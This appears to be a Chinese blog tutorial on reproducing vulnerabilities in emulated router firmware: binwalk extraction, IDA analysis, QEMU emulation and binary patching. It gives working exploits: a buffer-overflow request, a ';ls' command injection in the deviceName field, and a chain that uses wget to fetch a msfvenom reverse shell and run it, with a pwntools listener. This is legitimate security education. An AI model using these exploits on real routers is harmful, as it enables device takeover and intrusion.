---
title: IoT 固件漏洞分析及复现
date: 2025-04-26
categories: Web安全
toc: true
---

嵌入式固件（Firmware）是 IoT 设备中直接与硬件交互的核心软件，通常采用底层 C/C++ 开发，极易引入内存安全问题。本文以某 Type-1（Linux-based）路由器固件为例，详细分析其 HTTP 服务程序中的缓冲区溢出与命令注入漏洞，实现从固件提取、静态逆向、动态仿真到漏洞利用全流程。

<!--more-->


## 背景知识

固件类型主要分为三类：

- Type-1：基于常规操作系统的固件（Linux）
- Type-2：基于实时操作系统的固件（RTOS）
- Type-3：裸机固件，没有专用操作系统



本文重点讨论 Type-1 固件，典型构成包括：

1. 通用操作系统内核

2. 文件系统（常用 [SquashFS](https://openwrt.org/docs/techref/filesystems#squashfs)，[JFFS2](https://openwrt.org/docs/techref/filesystems#jffs2) 等文件系统格式），用于存储数据文件和可执行程序。

Type-1 固件通常以 .img、.bin 等格式打包发布，可能经过压缩或加密。文件系统内包含轻量级用户空间、厂商自定义服务以及内核模块（LKM）。



自定义常见服务包括面向外部的 HTTP、FTP、SSH 等，以及面向内部的数据库服务。

固件常使用特殊交互机制，如 NVRAM（键值对形式的非易失性存储）和 CGI（Common Gateway Interface）实现 Web 服务。

![image-20260426195413155](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png)



## GoAhead 介绍

[GoAhead]([GoAhead Overview](https://www.embedthis.com/goahead/doc/)) 是一款用于构造嵌入式 Web 应用的开源库，实现了一套名为 GoForms 的 CGI

与 lighttp 不同，GoForms 在进程内实现 CGI，在分析固件的过程中无需进行跨进程的分析

![image-20260426233746167](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png)

![image-20260426234022346](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png)



## 提取固件文件系统

- Type-1 固件包含文件系统，厂商将其打包发布
- Type-2/3 固件不含文件系统，二进制代码直接刷写在特定的 Flash 区域

逆向 Type-1 固件前需要对固件文件系统进行解压

解压方式：线性扫描、通过 magic number 识别常见文件格式、识别文件系统

> 固件可能被加密，或者厂商自定义文件格式



Binwalk 是一个主要用于分析和提取固件镜像中的文件系统和文件，它支持多种固件格式，并且能够自动识别并处理这些格式，使用户无需关心底层细节即可轻松完成固件的逆向分析工作，Binwalk 的主要功能包括：

**固件扫描**：自动检测固件镜像类型，识别并列出所有已知的固件签名。

**文件提取**：从固件镜像中提取文件系统或单个文件，支持多种压缩算法和编码方式。

**递归扫描**：对于嵌套的固件镜像，Binwalk 可以递归地进行扫描和提取，确保无遗漏。

**脚本支持**：通过 Python 脚本扩展功能，用户可以自定义扫描规则或处理逻辑。

```bash
# Kali 自带，如需更新
sudo apt update
sudo apt install binwalk

# 安装额外工具（用于提取更多格式）
sudo apt install mtd-utils gzip bzip2 tar arj lhasa p7zip \
  p7zip-full cabextract cramfsswap squashfs-tools \
  sleuthkit default-jdk lzop srecord
```

```bash
binwalk -Me firmware.bin
```



运行结果：

```
Target File:   /home/yang/IoT/firmware.bin
MD5 Checksum:  e20a266400568f8edaef73ad164f1ba3
Signatures:    411


DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
64            0x40            TRX firmware header, little endian, image size: 10559488 bytes, CRC32: 0xFA817870, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x1C9CD4, rootfs offset: 0x0
92            0x5C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 4585280 bytes
1875220       0x1C9D14        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 8680744 bytes, 926 inodes, blocksize: 131072 bytes, created: 2017-05-10 14:10:50
```

这是一个包含 TRX 头的嵌入式 Linux 固件

使用 SquashFS 文件系统(高度压缩的只读文件系统)

创建时间：2017-05-10 14:10:50

```
Target File:   /home/yang/IoT/_firmware.bin.extracted/5C
MD5 Checksum:  4a339098668a42ae688c6579616c4a5f
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
126976        0x1F000         ASCII cpio archive (SVR4 with no CRC), file name: "/dev", file name length: "0x00000005", file size: "0x00000000"
127092        0x1F074         ASCII cpio archive (SVR4 with no CRC), file name: "/dev/console", file name length: "0x0000000D", file size: "0x00000000"
127216        0x1F0F0         ASCII cpio archive (SVR4 with no CRC), file name: "/root", file name length: "0x00000006", file size: "0x00000000"
127332        0x1F164         ASCII cpio archive (SVR4 with no CRC), file name: "TRAILER!!!", file name length: "0x0000000B", file size: "0x00000000"
208731        0x32F5B         LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 64 bytes
1686137       0x19BA79        Certificate in DER format (x509 v3), header length: 4, sequence length: 1284
1686253       0x19BAED        Certificate in DER format (x509 v3), header length: 4, sequence length: 1288
2989749       0x2D9EB5        Certificate in DER format (x509 v3), header length: 4, sequence length: 1292
2989753       0x2D9EB9        Certificate in DER format (x509 v3), header length: 4, sequence length: 1304
2989757       0x2D9EBD        Certificate in DER format (x509 v3), header length: 4, sequence length: 1308
3320288       0x32A9E0        Linux kernel version 2.6.36
3375376       0x338110        DES SP2, little endian
3375888       0x338310        DES SP1, little endian
3399668       0x33DFF4        CRC32 polynomial table, little endian
3443008       0x348940        VxWorks symbol table, little endian, first entry: [type: initialized data, code address: 0xC03EECEE, symbol address: 0xFFFF0012]
3445128       0x349188        CRC32 polynomial table, little endian
3913499       0x3BB71B        Unix path: /home/work/workspace/UGW5.0_AC_PRODUCT/bsp/kernel/bcm4708_wl_6.37.14.93_2.6.36/arch/arm/include/asm/dma-mapping.h
4012861       0x3D3B3D        xz compressed data
4124228       0x3EEE44        Neighborly text, "neighbor %.2x%.2x.%pM lostename link %s to %s"
4514599       0x44E327        LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 32 bytes
```

使用 Linux 操作系统，版本为 2.6.36



使用 binwalk 提取到的固件文件系统：
- bin：固件二进制程序目录，包含固件服务器的二进制可执行程序
- lib：固件使用的库的文件夹，固件可执行程序可能使用其中的库，如果你希望进一步逆向库中的内容，可以在这里找到
- cfg：固件的相关配置文件夹
- webroot_ro：固件静态资源目录，包含网络服务的html文档、css文档和js脚本等

![image-20260426213908086](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png)

用 IDA pro 逆向 http 服务程序

实验重点分析 formSetSpeedWan、setUsbUnload 函数



## 静态分析

### formSetSpeedWan 缓冲区溢出

先静态分析一下代码

![image-20260426201132089](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png)

函数一开始就有三个变量：speed_dir    ucloud_enable    password

结合函数被引用位置：

![image-20260426201253404](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png)

结合 http 服务程序，SetSpeedWan 和 formSetSpeedWan 函数绑定，推测是处理一个请求

那之前的三个参数应该是从 CGI 请求中读取参数

可以看到这里列出了很多请求方法以及处理函数

可以猜这里应该是在注册请求处理函数或者是正在进行分发处理



再找这个函数的被引用位置

![image-20260426201343602](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png)

46 行输出 initWebs ，所以说这里应该是 websOpenServer 初始化部分，那上面的函数就是在注册不同方法的处理函数



而它的被引用位置：

![image-20260426212423445](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png)

这看起来像个 main 函数，里面有几个环境检查，结合末尾的输出提示来看：

- 32 行 while 循环调用 `check_network` 检查网络环境
- `ConnectCfm ` 函数在服务启动前执行网络环境检查
- `sub_2EA1C` 函数 init Webs 成功



不使用真实硬件（路由器）进行实验，就要绕过这几个检查，让固件程序成功运行

静态分析先不考虑这部分，待会在搭建固件仿真环境



重新回到 formSetSpeedWan

![image-20260426201132089](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png)

关注一些敏感函数：doSystemCmd、sprintf

43 行 sprintf 的第二个参数来自 speed_dir（猜测 sub_2BABC 读取请求参数，也就是 GoForms 中的 websGetVar 获取请求参数）

这个参数没有经过可以将 speed_dir 字段构造得很长，使得 sprintf 缓冲区写入溢出，稍后搭建完仿真环境再进行验证





### setUsbUnload 命令注入

![image-20260426204159996](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png)

![image-20260426204140322](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png)

有一个参数：deviceName

关注敏感函数 doSystemCmd，发现直接将 v3 格式化到字符串中，然后执行命令，未经过任何过滤

那直接在正常字段 deviceName=xxxx 后利用分号注入命令



## 固件仿真

根据上面对函数的分析：

- 32 行 while 循环调用 `check_network` 检查网络环境
- `ConnectCfm ` 函数在服务启动前执行网络环境检查
- `sub_2EA1C` 函数 init Webs 成功

查看对应汇编：

![image-20250520011058877](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png)

需要绕过检查：

2e540 处函数返回值 r0 ，赋给 r3，再与 0 比较，大于 0 才跳转到后面，否则 sleep

那将 2e540 处赋值逻辑修改，永远给 r3 赋 1

![image-20250520012040838](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png)

下面同样，修改 2e564 处汇编，直接把 1 赋值给 r3，绕过检查

最终的启动脚本：

```shell
#!/bin/bash
# usage:
#   run_x86.sh /path/to/your/filesystem-root

set -e

# 网络环境准备：使用 tunctl 命令创建一个名为 br0 的虚拟网络接口，并用当前用户（whoami命令返回）作为其所有者。
tunctl -t br0 -u `whoami`
ifconfig br0 192.168.0.4/24

# 将 cpy r3,r0 修改为 mov r3,1（'\x01\x30\xa0\xe3'）
# 计算这条指令的位置：0x2e540 - 0x08000 = 0x26540 = 156992 字节 使用 dd 命令修改
printf '\x01\x30\xa0\xe3' | dd of=$1/bin/httpd bs=1 count=4 seek=156992 conv=notrunc

# 将 cpy r3,r0 指令修改为 mov r3,1（'\x01\x30\xa0\xe3'）
# 修改位置：0x2e564 - 0x08000 = 0x26564 = 157028字节
printf '\x01\x30\xa0\xe3' | dd of=$1/bin/httpd bs=1 count=4 seek=157028 conv=notrunc

# 创建 proc 文件系统目录
if [ ! -d "$1/proc/sys/kernel" ]; then
    mkdir -p $1/proc/sys/kernel
fi
if [ ! -d "$1/proc/sys/net/ipv4" ]; then
    mkdir -p $1/proc/sys/net/ipv4
fi

# 准备 webroot
rm -rf $1/webroot
cp -r $1/webroot_ro $1/webroot

# 复制内核 core_pattern 设置
echo `cat /proc/sys/kernel/core_pattern`>$1/proc/sys/kernel/core_pattern

# 复制 qemu-arm-static 到 chroot 环境中（ARM用户态模拟器）
cp `which qemu-arm-static` $1/qemu

# 运行 chroot 环境
# 切换到 $1 指定的文件系统根目录
# 执行 QEMU 模拟器运行 ARM 版本的 httpd 服务器
# -L .指定动态链接库搜索路径为当前目录
chroot $1 ./qemu -L . ./bin/httpd
```

运行 shell 程序，仍然报错无法使用 80 端口

![image-20260426203254089](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png)

发现被 apache 占用，暂时关闭 apache

```bash
sudo systemctl stop apache2
```

![image-20260426203620318](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png)

此时显示已经在监听 80 端口，试着访问一下网页

![image-20260426203758109](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png)

可以看到能成功访问，证明 http 服务仿真成功



## 动态验证

### formSetSpeedWan

![image-20260426201132089](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png)

和之前分析一样，43 行 sprintf 的第二个参数来自 speed_dir

将 speed_dir 字段构造得很长，使得 sprintf 缓冲区写入溢出

```python
import requests

ip = '192.168.0.4'
url = f'http://{ip}/goform/SetSpeedWan'
payload = {'speed_dir': 'a'*1000}

r = requests.post(url=url,data=payload)
r = requests.post(url=url,data=payload)

print(r.content)
```

![image-20260426203947523](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17.png)

发现服务发生段错误中止，证明确实存在缓冲区溢出



### setUsbUnload 

之前分析过直接在 deviceName=xxxx 添加分号，如何就可以注入命令，试试：

```python
import requests
from pwn import*

ip = "192.168.0.4"
url = "http://" + ip + "/goform/setUsbUnload"
payload = ";ls"
data = {"deviceName":payload}

r = requests.post(url=url,data=data)
r = requests.post(url=url,data=data)
print(r.text)
```

客户端正常返回：

![image-20260426204559723](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/18.png)

固件服务：

![image-20260426204612273](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/19.png)

服务端输出了一些文件，证明命令注入漏洞确实存在



#### 漏洞利用

接下来进行漏洞利用

利用 **metasploit-framework** 生成反向连接192.168.0.4 的1234端口的能够反弹shell的恶意程序

```sh
msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.0.4 LPORT=1234 -f elf -o msf-arm
```

![image-20260426205422954](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20.png)

目的是让固件服务器下载这个恶意程序，并执行。

能注入命令，使用 wget 让固件服务器自己下载恶意程序，需要我们自己再搭一个 http 服务器



启动 Python HTTP 服务器，监听端口号为8000，根目录为当前目录。固件服务器从这个服务器下载 msf-arm 恶意程序

```sh
python -m http.server 8000 -d `pwd`
```



payload：

> pip install pwntools

```python
from pwn import *
import requests
from threading import Thread

#构造注入的命令
cmd = 'wget http://0.0.0.0:8000/msf-arm -O /msf;'  #从我们创建的服务器下载msf文件
cmd += 'chmod 777 /msf;'   #添加执行权限
cmd += '/msf' 			   #执行反弹shell的二进制程序

ip = "192.168.0.4"

url = "http://" + ip + "/goform/setUsbUnload"  

payload = ";" + cmd  # 注入命令

data = {"deviceName":payload}

def attack():
    r = requests.post(url=url,data=data) 

thread = Thread(target=attack) # 创建线程进行攻击
thread.start()

io = listen(1234)  # 主进程进行监听1234端口，固件将连接到我们的1234端口
io.wait_for_connection()
io.interactive() # 监听收到连接后进入交互模式
```

结果：

python 搭建的 HTTP 服务器被访问，下载 msf-arm

![image-20260426211452747](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/21.png)

固件服务器下载了我们的反弹 shell 恶意程序

![image-20260426211510230](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/22.png)

在攻击者的 shell 里成功获取了固件服务器的 shell

![image-20260426211438132](../assets/img/%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/23.png)













